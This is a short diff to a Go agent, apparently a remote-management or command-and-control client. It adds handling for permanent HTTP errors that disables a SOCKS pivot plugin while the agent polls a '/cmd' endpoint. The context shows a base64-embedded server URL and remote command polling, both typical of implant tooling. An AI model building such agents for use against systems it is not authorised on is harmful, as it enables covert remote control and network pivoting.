@@ -170,6 +170,19 @@ func isSessionTerminatedError(err error) bool {
 	return err != nil && strings.Contains(strings.ToUpper(err.Error()), "TERMINATED")
 }
 
+func isPermanentHTTPError(err error) bool {
+	if err == nil {
+		return false
+	}
+	message := err.Error()
+	for _, status := range []string{"HTTP 400", "HTTP 401", "HTTP 403", "HTTP 404"} {
+		if strings.HasPrefix(message, status) {
+			return true
+		}
+	}
+	return false
+}
+
 func loadConfig() (*config, error) {
 	cfg := &config{
 		BaseURL:       strings.TrimRight(envOr("RMM_BASE_URL", embeddedValue(defaultBaseURLB64)), "/"),
@@ -217,9 +230,16 @@ func register(client *http.Client, cfg *config) error {
 	return err
 }
 
-func pollOnce(client *http.Client, cfg *config, pivot *socksPluginController) error {
+func pollOnce(
+	client *http.Client,
+	cfg *config,
+	pivot *socksPluginController,
+) error {
 	data, err := request(client, cfg, http.MethodGet, "/cmd", values(cfg), nil)
 	if err != nil {
+		if isPermanentHTTPError(err) {
+			pivot.syncActive(false, client, cfg)
+		}
 		return err
 	}
 	var reply commandResponse
